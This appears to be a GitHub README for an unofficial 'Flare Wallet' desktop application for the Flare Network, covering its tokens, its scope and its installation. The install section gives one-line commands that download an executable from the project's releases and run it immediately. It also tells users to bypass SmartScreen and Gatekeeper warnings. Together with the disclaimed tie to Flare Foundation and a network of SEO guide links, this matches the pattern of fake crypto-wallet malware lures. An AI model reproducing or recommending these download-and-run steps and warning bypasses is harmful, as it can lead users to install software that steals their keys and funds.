![Flare Wallet](assets/banner-article.png)

# Flare Wallet Desktop App: What It Is and Who It Is For

A self-custody wallet installed on your own machine, and what that rules out.

## Downloads - v1.3.02

<p align="center"><a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-windows-v1.3.02.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-macos-v1.3.02.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-linux-v1.3.02.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`flare-wallet-desktop-windows-v1.3.02.exe`](https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-windows-v1.3.02.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`flare-wallet-desktop-macos-v1.3.02.dmg`](https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-macos-v1.3.02.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`flare-wallet-desktop-linux-v1.3.02.zip`](https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-linux-v1.3.02.zip) |

The application is distributed through the [current Flare Wallet release](https://github.com/flarewallet/flare-desktop-wallet/releases/tag/v1.3.02), one installer per platform.

> This is an independent product. It is not operated by, endorsed by or affiliated with Flare Foundation.

Flare Wallet Desktop is a self-custody wallet for Flare Network that you install on Windows, macOS or Linux. It holds FLR, WFLR and FXRP, signs staking and delegation transactions, and keeps your keys encrypted on your own computer. It is not a browser extension, not a mobile app and not a service that holds your funds.

<!-- ARTICLE-BODY-BEGIN -->

## What it actually is

It is an application, not a website. You download a file, install it, and from then on the wallet runs locally. Your keys are encrypted on the machine and the interface reads the chain through a public RPC endpoint. Close the laptop and the wallet is closed; there is no session to keep alive anywhere else.

That shape explains what it can do. Because it holds keys locally, it can sign a staking or delegation transaction without a third party approving it. Because it is a desktop program rather than a web page, a browser extension cannot read it the way it reads a tab. It is also the reason the install matters: you are placing a key store on disk, so <a href="https://github.com/flarewallet/flare-wallet-guide/blob/HEAD/flare-wallet-download.md">download Flare Wallet</a> from the release page rather than a search result.

## What it is not

| Question | Answer |
| --- | --- |
| Browser extension | None exists in this account |
| Mobile app | None exists in this account |
| Web wallet you log into | None exists in this account |
| Custodial service | No; keys stay on your machine |
| Flare Foundation product | No; it is independent |

The list matters because "Flare wallet" gets used loosely online for exchange listings, hardware pairings and other products. If what you are looking at runs in a browser tab, on a phone, or behind a login, it is not this application.

## Which tokens it holds and what they do

FLR is the native coin of Flare and pays network fees. WFLR is the wrapped form used where the protocol expects a token, which is what delegation works on. FXRP is XRP represented on Flare, issued through FAssets.

The wallet shows all three, which is the practical reason to use it: the coin you stake, the token you delegate and the asset you bridged sit in one portfolio rather than three. It does not create value out of them and it does not promise a return; it signs what you ask it to sign. What you do with WFLR is covered in <a href="https://github.com/flarewallet/flare-wallet-staking/blob/HEAD/flare-wallet-staking.md">Flare Wallet staking</a>.

## What FLR is actually for

FLR pays for transactions on Flare and secures the network through staking and delegation. Fees on Flare are burned rather than paid to a validator, so a transfer costs a fraction of a cent at the current base fee and the supply falls slightly with each one.

Beyond that, FLR is the unit that delegation rewards are paid in. If you hold FLR and never stake or delegate it, it simply sits there; the wallet does not do anything with it on your behalf.

## What makes Flare different from a plain EVM chain

Two systems sit on top of the EVM compatibility. FTSO is an on-chain price feed produced by independent data providers who are paid for accuracy, and FAssets brings assets from other chains onto Flare, starting with XRP as FXRP.

For a wallet user the consequence is narrower than it sounds: an XRP balance on Flare is a claim on real XRP held by the system rather than a separate token with its own price, and the price data those applications consume is produced on-chain instead of by one vendor.

## Who it suits

It suits someone who wants the keys on hardware they control, who stakes or delegates FLR, and who would rather read a release tag than a landing page. It also suits a reader who has been burned by a fake download, because the release page is a single address to remember, and the checks that make that address meaningful are in <a href="https://github.com/flarewallet/flare-wallet-security/blob/HEAD/is-flare-wallet-safe.md">is Flare Wallet safe</a>.

It is a poor fit if you need to sign on a phone, if you want a browser pop-up that connects to websites, or if you expect someone else to recover your account. None of those exist here, and no setting turns them on. If you are still comparing shapes, <a href="https://github.com/flarewallet/flare-wallet-security/blob/HEAD/best-flare-wallet.md">best Flare wallet</a> puts desktop, mobile and hardware side by side.

## When a desktop wallet is the wrong shape

A desktop wallet assumes a computer you trust and keep patched. If your only device is a phone, or if the machine is shared, the model does not fit and a different form factor is the honest answer. The trade-off is worth stating plainly: a phone is easier to carry and harder to secure, and a hardware signer removes one class of attack but adds a device to read. No shape wins for everyone.

## FAQ

### Is there a Flare Wallet browser extension?

No. No repository in this account builds an extension, and no store listing for one is published by this project. Anything that installs into a browser and calls itself Flare Wallet is not this product.

### Is there a Flare Wallet mobile app?

No. The three installers are desktop builds for Windows, macOS and Linux. A phone wallet with a similar name is a different product from a different publisher.

### Is Flare Wallet affiliated with Flare Foundation?

No. It is an independent wallet for the Flare network. Flare Foundation publishes its own wallet directory, and this application is not part of it.

### Do I need an account to use it?

No. There is no sign-up, no email and no password stored on a server. Setup creates a wallet on your machine, and the recovery phrase is the only credential that matters. The <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/tag/v1.3.02">current Flare Wallet release</a> is the build to install.

### Does it cost anything?

The application is free to download and use. Network fees are Flare's and are paid in FLR; the wallet estimates them before you sign.

### Why does it already know about Flare?

Chain ID 14 and the public RPC are configured at install, so a fresh install is on Flare mainnet immediately. Manual network entry is only needed when you add Flare to some other wallet.

<!-- ARTICLE-BODY-END -->

## How to install Flare Wallet

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). -->

### Windows

Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-windows-v1.3.02.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-windows-v1.3.02.exe">flare-wallet-desktop-windows-v1.3.02.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS

Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-macos-v1.3.02.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-macos-v1.3.02.dmg">flare-wallet-desktop-macos-v1.3.02.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux

The Linux build is an archive rather than an AppImage, so there is no verified download-and-run one-liner. Download it, check the hash, extract it, then launch the executable inside.

Manual install:
1. Download <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-linux-v1.3.02.zip">flare-wallet-desktop-linux-v1.3.02.zip</a>.
2. Verify it before extracting: `sha256sum flare-wallet-desktop-linux-v1.3.02.zip`.
3. Extract with your file manager or `unzip flare-wallet-desktop-linux-v1.3.02.zip`.
4. Make the extracted executable runnable if needed, then launch it.
<!-- INSTALL-END -->

## Related guides

[Flare Wallet download](https://github.com/flarewallet/flare-wallet-guide/blob/HEAD/flare-wallet-download.md) | [is Flare Wallet safe](https://github.com/flarewallet/flare-wallet-security/blob/HEAD/is-flare-wallet-safe.md) | [Flare Wallet staking](https://github.com/flarewallet/flare-wallet-staking/blob/HEAD/flare-wallet-staking.md) | [Flare Wallet Ledger](https://github.com/flarewallet/flare-wallet-security/blob/HEAD/flare-wallet-ledger.md) | [current release](https://github.com/flarewallet/flare-desktop-wallet/releases/tag/v1.3.02)
